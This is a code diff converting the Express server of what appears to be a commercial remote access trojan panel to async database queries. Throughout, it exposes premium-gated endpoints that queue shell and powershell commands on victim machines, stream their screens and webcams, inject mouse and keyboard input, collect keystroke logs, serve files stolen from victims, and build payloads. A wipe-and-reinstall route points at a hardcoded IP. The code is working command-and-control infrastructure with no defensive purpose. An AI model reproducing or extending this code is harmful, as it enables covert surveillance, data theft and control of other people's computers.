@@ -1,4 +1,4 @@
-// language: JavaScript, file: server.js, target: Node 22.5+
+// language: JavaScript, file: server.js
 import 'dotenv/config';
 import express from 'express';
 import helmet from 'helmet';
@@ -12,7 +12,7 @@ import http from 'node:http';
 import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
-import db, { UPLOAD_DIR } from './db.js';
+import db, { initDb, UPLOAD_DIR } from './db.js';
 import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
@@ -53,14 +53,19 @@ const tlsOpts = {
   key:  fs.readFileSync(CFG.tlsKey),
 };
 
-// Build the universal st.jar on startup
+// Async startup tasks
 (async () => {
   try {
+    console.log('[startup] Initializing Database...');
+    await initDb();
+    console.log('[startup] Database ready.');
+    
     console.log('[startup] Building st.jar payload...');
     await buildJavaPayload();
     console.log('[startup] st.jar built successfully.');
   } catch (e) {
-    console.error('[startup] Failed to build st.jar:', e);
+    console.error('[startup] Failed startup:', e);
+    process.exit(1);
   }
 })();
 
@@ -101,8 +106,8 @@ app.use((req, res, next) => {
 
 app.post('/api/rpc',
   express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
-  (req, res) => {
-    try { res.json(handleRpc(req.body, req.ip)); }
+  async (req, res) => {
+    try { res.json(await handleRpc(req.body, req.ip)); }
     catch (e) { console.error('[rpc]', e); res.status(500).json({ error: 'rpc error' }); }
   }
 );
@@ -147,11 +152,6 @@ const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error:
 
 app.use(limitGlobal);
 
-const sql = (strings, ...vals) => {
-  if (vals.length) throw new Error('sql tagged template refused — use ? params');
-  return strings[0];
-};
-
 const ALPHA = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
 function genBlock4() {
   return Array.from({ length: 4 }, () => ALPHA[crypto.randomInt(ALPHA.length)]).join('');
@@ -162,19 +162,28 @@ function genLoginTok() { return [genBlock4(), genBlock4(), genBlock4(), genBlock
 const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
 const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });
 
-function requireAuth(req, res, next) {
+async function requireAuth(req, res, next) {
   const token = req.cookies?.token;
   if (!token) return res.status(401).json({ error: 'unauthorized' });
-  try { req.user = jwt.verify(token, CFG.jwtSecret); next(); }
-  catch { return res.status(401).json({ error: 'unauthorized' }); }
+  try { 
+    req.user = jwt.verify(token, CFG.jwtSecret); 
+    next(); 
+  }
+  catch { 
+    return res.status(401).json({ error: 'unauthorized' }); 
+  }
 }
 
-function requirePremium(req, res, next) {
-  const row = getOwnUser(req.user.uid);
-  if (!row || !row.premium_until || row.premium_until < Date.now()) {
-    return res.status(403).json({ error: 'Premium required or expired. Please upgrade your account.' });
+async function requirePremium(req, res, next) {
+  try {
+    const row = await getOwnUser(req.user.uid);
+    if (!row || !row.premium_until || Number(row.premium_until) < Date.now()) {
+      return res.status(403).json({ error: 'Premium required or expired. Please upgrade your account.' });
+    }
+    next();
+  } catch (e) {
+    res.status(500).json({ error: 'internal error' });
   }
-  next();
 }
 
 const isDiscordWebhook = (url) => typeof url === 'string' &&
@@ -193,10 +202,13 @@ async function sendWebhook(url, payload) {
   } catch { return false; }
 }
 
-const getOwnUser = (uid) => db.prepare(sql`
-  SELECT id, username, email, account_key, login_token, discord_webhook, created_at, premium_until
-  FROM users WHERE id = ?
-`).get(uid);
+async function getOwnUser(uid) {
+  const [rows] = await db.query(`
+    SELECT id, username, email, account_key, login_token, discord_webhook, created_at, premium_until
+    FROM users WHERE id = ?
+  `, [uid]);
+  return rows[0];
+}
 
 // ─── wipe command builder ────────────────────────────────────────────────────
 function buildWipeCommand(serverBase) {
@@ -303,11 +315,11 @@ app.get('/api/health', (_req, res) => {
              time: new Date().toISOString() });
 });
 
-app.get('/api/getkey/:buildId', (req, res) => {
+app.get('/api/getkey/:buildId', async (req, res) => {
   const buildId = Number(req.params.buildId);
-  const row = db.prepare(sql`SELECT key FROM builds WHERE id = ?`).get(buildId);
-  if (!row) return res.status(404).send('{"error": "not found"}');
-  res.send(`{"key": "${row.key}"}`);
+  const [rows] = await db.query(`SELECT \`key\` FROM builds WHERE id = ?`, [buildId]);
+  if (!rows.length) return res.status(404).send('{"error": "not found"}');
+  res.send(`{"key": "${rows[0].key}"}`);
 });
 
 app.post('/api/signup', limitAuth, async (req, res) => {
@@ -323,8 +335,8 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   if (!isDiscordWebhook(discordWebhook))
     return res.status(400).json({ error: 'invalid discord webhook url' });
 
-  const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
-  if (exists) return res.status(409).json({ error: 'username or email taken' });
+  const [exists] = await db.query(`SELECT id FROM users WHERE username = ? OR email = ?`, [username, email]);
+  if (exists.length) return res.status(409).json({ error: 'username or email taken' });
 
   const webhookOk = await sendWebhook(discordWebhook, {
     content: `webhook verified for \`${username}\``,
@@ -338,12 +350,12 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   const accountKey = genKey();
   const loginToken = genLoginTok();
 
-  const info = db.prepare(sql`
+  const [info] = await db.query(`
     INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?)
-  `).run(username, email, hash, accountKey, loginToken, discordWebhook, Date.now());
+  `, [username, email, hash, accountKey, loginToken, discordWebhook, Date.now()]);
 
-  const user = { id: Number(info.lastInsertRowid), username };
+  const user = { id: Number(info.insertId), username };
 
   sendWebhook(discordWebhook, {
     content: `keys for **${username}**`,
@@ -367,15 +379,18 @@ app.post('/api/signin', limitAuth, async (req, res) => {
   let user = null;
 
   if (loginToken && !password) {
-    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
+    const [rows] = await db.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
+    user = rows[0];
   } else if (loginToken && password) {
-    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
+    const [rows] = await db.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
+    user = rows[0];
     if (user) {
       const ok = await bcrypt.compare(password, user.password_hash);
       if (!ok) user = null;
     }
   } else if (username && password) {
-    user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
+    const [rows] = await db.query(`SELECT * FROM users WHERE username = ? OR email = ?`, [username, username]);
+    user = rows[0];
     if (user) {
       const ok = await bcrypt.compare(password, user.password_hash);
       if (!ok) user = null;
@@ -392,8 +407,8 @@ app.post('/api/signin', limitAuth, async (req, res) => {
 
 app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });
 
-app.get('/api/me', requireAuth, (req, res) => {
-  const row = getOwnUser(req.user.uid);
+app.get('/api/me', requireAuth, async (req, res) => {
+  const row = await getOwnUser(req.user.uid);
   if (!row) return res.status(404).json({ error: 'not found' });
   res.json({
     username: row.username,
@@ -403,7 +418,7 @@ app.get('/api/me', requireAuth, (req, res) => {
     discordWebhook: row.discord_webhook,
     createdAt: row.created_at,
     premium_until: row.premium_until,
-    isPremium: row.premium_until > Date.now()
+    isPremium: Number(row.premium_until) > Date.now()
   });
 });
 
@@ -415,7 +430,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
     embeds: [{ title: 'connection live', color: 0x29B6F6, timestamp: new Date().toISOString() }],
   });
   if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
-  db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
+  await db.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
   res.json({ ok: true });
 });
 
@@ -438,23 +453,23 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   }
   const where = filters.join(' AND ');
 
-  const totalRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`).get(...params);
-  const rows = db.prepare(`
+  const [countRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`, params);
+  const totalRow = countRows[0];
+
+  const [rows] = await db.query(`
     SELECT id, hostname, ip, last_seen FROM clients
     WHERE ${where}
     ORDER BY ((id * 1103515245 + user_id * 12345) % 2147483647) ASC
     LIMIT ? OFFSET ?
-  `).all(...params, limitN, offset);
+  `, [...params, limitN, offset]);
 
-  const onlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`)
-    .get(req.user.uid, cutoff);
-  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
-    .get(req.user.uid, cutoff);
+  const [onlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`, [req.user.uid, cutoff]);
+  const [offlineRows] = await db.query(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`, [req.user.uid, cutoff]);
 
   res.json({
     total:   Number(totalRow.n),
-    online:  Number(onlineRow.n),
-    offline: Number(offlineRow.n),
+    online:  Number(onlineRows[0].n),
+    offline: Number(offlineRows[0].n),
     rows: rows.map(r => ({
       id: r.id,
       hostname: r.hostname,
@@ -468,25 +483,26 @@ app.get('/api/clients', requireAuth, async (req, res) => {
   });
 });
 
-app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
+app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  const rows = db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const [rows] = await db.query(`
     SELECT id, filename, size, created_at FROM uploads
     WHERE user_id = ? AND client_id = ?
     ORDER BY created_at DESC LIMIT 200
-  `).all(req.user.uid, clientId);
+  `, [req.user.uid, clientId]);
   res.json(rows);
 });
 
-app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, (req, res) => {
+app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, async (req, res) => {
   const uploadId = Number(req.params.id);
-  const row = db.prepare(sql`
+  const [rows] = await db.query(`
     SELECT filename, stored_name, size FROM uploads
     WHERE id = ? AND user_id = ?
-  `).get(uploadId, req.user.uid);
-  if (!row) return res.status(404).json({ error: 'not found' });
+  `, [uploadId, req.user.uid]);
+  if (!rows.length) return res.status(404).json({ error: 'not found' });
+  const row = rows[0];
   const src = path.join(UPLOAD_DIR, row.stored_name);
   if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
   res.setHeader('Content-Type', 'application/zip');
@@ -495,7 +511,7 @@ app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium,
   fs.createReadStream(src).pipe(res);
 });
 
-app.post('/api/clients/:id/exec', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/exec', requireAuth, requirePremium, async (req, res) => {
   const clientId = Number(req.params.id);
   const { shell, line } = req.body || {};
   if (!['cmd', 'powershell', 'file'].includes(shell))
@@ -504,44 +520,45 @@ app.post('/api/clients/:id/exec', requireAuth, requirePremium, (req, res) => {
   if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
     return res.status(400).json({ error: 'bad line' });
 
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
 
-  const info = db.prepare(sql`
+  const [info] = await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, ?, ?, 'pending', ?)
-  `).run(req.user.uid, clientId, shell, line, Date.now());
+  `, [req.user.uid, clientId, shell, line, Date.now()]);
 
-  res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
+  res.json({ ok: true, commandId: Number(info.insertId) });
 });
 
-app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
+app.get('/api/clients/:id/commands', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
-  const rows = db.prepare(sql`
+  const [rows] = await db.query(`
     SELECT id, shell, line, output, status, created_at FROM commands
     WHERE user_id = ? AND client_id = ?
     ORDER BY created_at DESC LIMIT 100
-  `).all(req.user.uid, clientId);
+  `, [req.user.uid, clientId]);
   res.json(rows);
 });
 
 app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
   const clientId = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   try {
-    const info = db.prepare(sql`
+    const [info] = await db.query(`
       INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
       VALUES (?, ?, 'sysinfo', '', 'pending', ?)
-    `).run(req.user.uid, clientId, Date.now());
+    `, [req.user.uid, clientId, Date.now()]);
 
-    const cmdId = Number(info.lastInsertRowid);
+    const cmdId = Number(info.insertId);
     const deadline = Date.now() + 10000;
 
     while (Date.now() < deadline) {
       await new Promise(r => setTimeout(r, 150));
-      const row = db.prepare(sql`SELECT output, status FROM commands WHERE id = ?`).get(cmdId);
+      const [rows] = await db.query(`SELECT output, status FROM commands WHERE id = ?`, [cmdId]);
+      const row = rows[0];
       if (!row) continue;
       if (row.status === 'done') {
         try {
@@ -558,23 +575,22 @@ app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res
   }
 });
 
-app.delete('/api/clients/:id', requireAuth, (req, res) => {
+app.delete('/api/clients/:id', requireAuth, async (req, res) => {
   const clientId = Number(req.params.id);
-  const info = db.prepare(sql`DELETE FROM clients WHERE id = ? AND user_id = ?`).run(clientId, req.user.uid);
-  if (info.changes === 0) return res.status(404).json({ error: 'not found' });
+  const [info] = await db.query(`DELETE FROM clients WHERE id = ? AND user_id = ?`, [clientId, req.user.uid]);
+  if (info.affectedRows === 0) return res.status(404).json({ error: 'not found' });
   res.json({ ok: true });
 });
 
-// ─── wipe + reinstall ────────────────────────────────────────────────────────
 app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   const stPath = path.join(DOWNLOAD_DIR, 'st.jar');
   let needsBuild = !fs.existsSync(stPath);
   if (needsBuild) {
-    const row = getOwnUser(req.user.uid);
+    const row = await getOwnUser(req.user.uid);
     const acctKey = row?.account_key || '';
     if (!acctKey) return res.status(400).json({ error: 'no account key to build st.jar' });
     try {
@@ -586,25 +602,24 @@ app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
   }
 
   const base = 'http://95.182.96.216'; // HARDCODED
-
   const line = buildWipeCommand(base);
 
-  const info = db.prepare(sql`
+  const [info] = await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'powershell', ?, 'pending', ?)
-  `).run(req.user.uid, cid, line, Date.now());
+  `, [req.user.uid, cid, line, Date.now()]);
 
   res.json({
     ok: true,
-    commandId: Number(info.lastInsertRowid),
+    commandId: Number(info.insertId),
     message: 'wiping + reinstalling',
   });
 });
 
-app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const cfg = {
     monitor:  Number(req.body.monitor  || 0),
     width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
@@ -614,36 +629,36 @@ app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, (req, res) =
     keyboard: req.body.keyboard === true,
     mouse:    req.body.mouse === true,
   };
-  db.prepare(sql`
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', ?, 'pending', ?)
-  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
+  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
-  `).run(req.user.uid, cid, Date.now());
+  `, [req.user.uid, cid, Date.now()]);
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/rdp/update', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/rdp/update', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const ok = sendCfg(cid, JSON.stringify(req.body || {}));
   res.json({ ok });
 });
 
-app.get('/api/clients/:id/screen', requireAuth, requirePremium, (req, res) => {
+app.get('/api/clients/:id/screen', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const bytes = getFrame(cid);
   if (!bytes) return res.status(204).end();
 
@@ -663,10 +678,10 @@ app.get('/api/clients/:id/screen', requireAuth, requirePremium, (req, res) => {
   res.send(bytes);
 });
 
-app.get('/api/clients/:id/cursor', requireAuth, requirePremium, (req, res) => {
+app.get('/api/clients/:id/cursor', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
 
   res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
   res.setHeader('Pragma', 'no-cache');
@@ -677,25 +692,25 @@ app.get('/api/clients/:id/cursor', requireAuth, requirePremium, (req, res) => {
   res.json(c);
 });
 
-app.get('/api/clients/:id/monitors', requireAuth, requirePremium, (req, res) => {
+app.get('/api/clients/:id/monitors', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   res.json(getMonitors(cid));
 });
 
-app.post('/api/clients/:id/input', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/input', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const ok = sendInput(cid, JSON.stringify(req.body || {}));
   res.json({ ok });
 });
 
-app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const cfg = {
     camera:  Number(req.body.camera  || 0),
     width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
@@ -703,28 +718,28 @@ app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, (req, res
     quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
     fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
   };
-  db.prepare(sql`
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', ?, 'pending', ?)
-  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
+  `, [req.user.uid, cid, JSON.stringify(cfg), Date.now()]);
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
-  `).run(req.user.uid, cid, Date.now());
+  `, [req.user.uid, cid, Date.now()]);
   res.json({ ok: true });
 });
 
-app.get('/api/clients/:id/webcam', requireAuth, requirePremium, (req, res) => {
+app.get('/api/clients/:id/webcam', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
   const bytes = getWebcamFrame(cid);
   if (!bytes) return res.status(204).end();
 
@@ -742,45 +757,45 @@ app.get('/api/clients/:id/webcam', requireAuth, requirePremium, (req, res) => {
   res.send(bytes);
 });
 
-app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
-  `).run(req.user.uid, cid, Date.now());
+  `, [req.user.uid, cid, Date.now()]);
   res.json({ ok: true });
 });
 
-app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, (req, res) => {
+app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  await db.query(`
     INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
     VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
-  `).run(req.user.uid, cid, Date.now());
+  `, [req.user.uid, cid, Date.now()]);
   res.json({ ok: true });
 });
 
-app.get('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
+app.get('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  const rows = db.prepare(sql`
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  const [rows] = await db.query(`
     SELECT id, data, created_at FROM keylogs
     WHERE user_id = ? AND client_id = ?
     ORDER BY created_at DESC LIMIT 500
-  `).all(req.user.uid, cid);
+  `, [req.user.uid, cid]);
   res.json(rows.reverse());
 });
 
-app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
+app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, async (req, res) => {
   const cid = Number(req.params.id);
-  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-  if (!client) return res.status(404).json({ error: 'client not found' });
-  db.prepare(sql`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`).run(req.user.uid, cid);
+  const [client] = await db.query(`SELECT id FROM clients WHERE id = ? AND user_id = ?`, [cid, req.user.uid]);
+  if (!client.length) return res.status(404).json({ error: 'client not found' });
+  await db.query(`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`, [req.user.uid, cid]);
   res.json({ ok: true });
 });
 
@@ -833,8 +848,6 @@ app.get('/api/downloads/:name', limitDownloadExe, (req, res) => {
   fs.createReadStream(full).pipe(res);
 });
 
-// ---------- builder — windows launcher ----------
-
 app.get('/api/build/bases', requireAuth, (req, res) => {
   res.json([]);
 });
@@ -842,7 +855,7 @@ app.get('/api/build/bases', requireAuth, (req, res) => {
 app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const { key } = req.body || {};
 
-  const row = getOwnUser(req.user.uid);
+  const row = await getOwnUser(req.user.uid);
   const acctKey = row?.account_key || '';
   const buildKey = (typeof key === 'string' && key.trim().length > 0)
     ? key.trim().slice(0, 128)
@@ -852,8 +865,8 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
   let zipBuf;
   try {
-    const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
-    const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
+    const [nextIdRows] = await db.query(`SELECT MAX(id) + 1 AS nextId FROM builds`);
+    const nextBuildId = nextIdRows[0]?.nextId ? nextIdRows[0].nextId : 1;
 
     zipBuf = await buildBoot({ key: buildKey, buildId: nextBuildId });
   } catch (e) {
@@ -866,47 +879,48 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   const outPath = path.join(BUILD_DIR, outName);
   fs.writeFileSync(outPath, zipBuf, { mode: 0o644 });
 
-  const stale = db.prepare(sql`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`).all(req.user.uid);
-  for (const b of stale) {
+  const [staleRows] = await db.query(`SELECT id, stored_name FROM builds WHERE user_id = ? AND base = 'boot'`, [req.user.uid]);
+  for (const b of staleRows) {
     if (b.stored_name && b.stored_name !== outName) {
       try { fs.unlinkSync(path.join(BUILD_DIR, b.stored_name)); } catch {}
     }
-    db.prepare(sql`DELETE FROM builds WHERE id = ?`).run(b.id);
+    await db.query(`DELETE FROM builds WHERE id = ?`, [b.id]);
   }
 
-  const info = db.prepare(sql`
-    INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
+  const [info] = await db.query(`
+    INSERT INTO builds (user_id, name, stored_name, size, base, \`key\`, config, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-  `).run(req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now());
+  `, [req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now()]);
 
